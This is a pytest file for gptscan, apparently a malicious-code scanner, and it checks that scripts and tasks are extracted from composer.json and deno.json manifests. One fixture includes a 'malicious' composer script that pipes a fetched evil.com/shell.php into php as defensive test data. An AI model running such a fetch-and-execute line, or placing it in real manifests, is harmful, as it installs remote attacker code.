import json
import pytest
from gptscan import unpack_content, Config, scan_files
from unittest.mock import MagicMock, patch
import gptscan

def test_unpack_composer_json_scripts():
    """Test that unpack_content correctly extracts scripts from composer.json."""
    composer_data = {
        "name": "vendor/package",
        "description": "A PHP project",
        "scripts": {
            "post-install-cmd": [
                "php -r \"copy('.env.example', '.env');\"",
                "php artisan key:generate"
            ],
            "test": "phpunit",
            "malicious": "curl -s http://evil.com/shell.php | php"
        }
    }
    composer_content = json.dumps(composer_data).encode('utf-8')
    results = list(unpack_content("composer.json", composer_content))

    # Should find 4 scripts: 2 from the list, 1 test, 1 malicious
    assert len(results) == 4

    script_names = [r[0] for r in results]
    assert "composer.json [Script: post-install-cmd (1)]" in script_names
    assert "composer.json [Script: post-install-cmd (2)]" in script_names
    assert "composer.json [Script: test]" in script_names
    assert "composer.json [Script: malicious]" in script_names

    script_contents = [r[1] for r in results]
    assert b"php artisan key:generate" in script_contents
    assert b"phpunit" in script_contents
    assert b"curl -s http://evil.com/shell.php | php" in script_contents

def test_unpack_deno_json_tasks():
    """Test that unpack_content correctly extracts tasks from deno.json."""
    deno_data = {
        "tasks": {
            "start": "deno run --allow-net main.ts",
            "test": "deno test",
            "build": "deno compile --output main main.ts"
        }
    }
    deno_content = json.dumps(deno_data).encode('utf-8')
    results = list(unpack_content("deno.json", deno_content))

    # Should find 3 tasks
    assert len(results) == 3

    task_names = [r[0] for r in results]
    assert "deno.json [Task: start]" in task_names
    assert "deno.json [Task: test]" in task_names
    assert "deno.json [Task: build]" in task_names

    task_contents = [r[1] for r in results]
    assert b"deno run --allow-net main.ts" in task_contents
    assert b"deno test" in task_contents

def test_unpack_deno_jsonc_with_comments():
    """Test that unpack_content handles deno.jsonc with comments."""
    deno_jsonc = """
    {
        // This is a comment
        "tasks": {
            /* This is also a comment */
            "start": "deno run main.ts",
            "check": "deno check **/*.ts" // Inline comment
        }
    }
    """
    deno_content = deno_jsonc.encode('utf-8')
    results = list(unpack_content("deno.jsonc", deno_content))

    # Should find 2 tasks despite comments
    assert len(results) == 2

    task_names = [r[0] for r in results]
    assert "deno.jsonc [Task: start]" in task_names
    assert "deno.jsonc [Task: check]" in task_names

    task_contents = [r[1] for r in results]
    assert b"deno run main.ts" in task_contents
    assert b"deno check **/*.ts" in task_contents

def test_unpack_deno_jsonc_with_urls():
    """Test that unpack_content handles deno.jsonc with URLs in strings and comments."""
    deno_jsonc = """
    {
        "tasks": {
            "fetch": "curl https://example.com/api", // This // should not be stripped
            "run": "deno run --allow-net=google.com main.ts" /* block // comment */
        }
    }
    """
    deno_content = deno_jsonc.encode('utf-8')
    results = list(unpack_content("deno.jsonc", deno_content))

    assert len(results) == 2

    task_contents = [r[1] for r in results]
    assert b"curl https://example.com/api" in task_contents
    assert b"deno run --allow-net=google.com main.ts" in task_contents

def test_is_supported_file_manifests():
    """Test that composer.json and deno.json are recognized as supported containers."""
    assert Config.is_supported_file("composer.json") is True
    assert Config.is_supported_file("deno.json") is True
    assert Config.is_supported_file("deno.jsonc") is True
    assert Config.is_supported_file("sub/dir/composer.json") is True

    # Verify non-container versions for members
    assert Config.is_supported_file("composer.json", is_member=True) is False
    assert Config.is_supported_file("deno.json", is_member=True) is False
